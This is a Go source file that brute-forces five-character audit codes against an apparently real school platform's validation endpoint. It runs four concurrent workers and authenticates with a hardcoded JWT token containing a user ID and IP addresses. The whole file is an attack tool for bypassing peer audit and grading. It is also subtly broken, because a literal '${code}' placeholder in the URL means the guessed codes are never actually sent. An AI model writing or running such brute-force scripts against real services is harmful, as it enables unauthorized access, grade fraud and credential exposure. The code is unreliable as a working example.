package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"strings"
	"sync"
	"time"
)

type CodeCreator struct {
	charset string
	length  int
	index   int
}

func (codeCreator *CodeCreator) Next() string {
	code := [5]byte{}
	currentIndex := float64(codeCreator.index)

	codeCreator.index++

	for i := 0; i < codeCreator.length; i++ {
		code[i] = codeCreator.charset[int(currentIndex)%len(codeCreator.charset)]
		currentIndex = math.Floor(currentIndex / float64(len(codeCreator.charset)))
	}

	return string(code[:])
}

func main() {
	// The thingy that manages codes
	codeCreator := CodeCreator{
		charset: "abcdefghijklmnopqrstuvwxyz0123456789-_$?",
		length:  5,
		index:   1050580,
	}

	// Time
	startTime := time.Now()
	lastCode := ""

	// The average counter thingy
	counter := 0
	speed := 0
	average := 0
	go func() {
		for {
			time.Sleep(time.Minute)
			if average == 0 {
				average = counter
			} else {
				average = (speed + counter) / 2
			}
			speed = counter
			counter = 0

			fmt.Printf(
				"Code: %s, Index: %d, Progress: %.2f%%, Speed|Average: %d|%d/m, Time: %s\n",
				lastCode,
				codeCreator.index,
				float32(codeCreator.index)/102400000*100,
				speed,
				average,
				func() string {
					// Calculate the time to be printed
					return time.Now().Sub(startTime).String()
				}(),
			)
		}
	}()

	// Create a waitgroup for the main thread not to exit
	wg := sync.WaitGroup{}
	wg.Add(1)

	for i := 0; i < 4; i++ {
		go func() {
			client := &http.Client{}
			for {
				code := codeCreator.Next()
				lastCode = code

				responseText, err := checkCode(client, code)

				if err != nil {
					log.Println(err)
					wg.Done()
				}

				if !strings.Contains(responseText, "Wrong audit code.") {
					fmt.Printf("SUCCESS!! Code: %s\n", code)
					wg.Done()
				}

				counter++
			}
		}()
	}

	wg.Wait()
	fmt.Println("---Program End---")
}

func checkCode(client *http.Client, code string) (string, error) {
	grade := 1.2857142857142858
	auditId := 12166
	eventId := 20
	groupId := 2159

	link := fmt.Sprintf(
		"https://01.kood.tech/api/validation/johvi/div-01/different-maps?grade=%f&code=${code}&auditId=%d&eventId=%d&groupId=%d&feedback={}",
		grade,
		auditId,
		eventId,
		groupId,
	)

	req, err := http.NewRequest("GET", link, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set(
		"x-jwt-token",
		"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIyMzY5IiwiaWF0IjoxNjUyNjE5NjY1LCJpcCI6IjIxMy4xODAuMTAuNTEsIDE3Mi4yMy4wLjIiLCJleHAiOjE2NTI3MDYwNjUsImh0dHBzOi8vaGFzdXJhLmlvL2p3dC9jbGFpbXMiOnsieC1oYXN1cmEtYWxsb3dlZC1yb2xlcyI6WyJ1c2VyIl0sIngtaGFzdXJhLWNhbXB1c2VzIjoie30iLCJ4LWhhc3VyYS1kZWZhdWx0LXJvbGUiOiJ1c2VyIiwieC1oYXN1cmEtdXNlci1pZCI6IjIzNjkiLCJ4LWhhc3VyYS10b2tlbi1pZCI6ImIzOTk5M2EyLWE5ZDQtNGIzYi05OWU2LTViZmVhYjE1MTJmZSJ9fQ.o_61wAUYeSvtWaMZFCCeg6DOTx9MoOBIT2cT_T5hYFQ",
	)

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	responseText := string(body)
	return responseText, nil
}
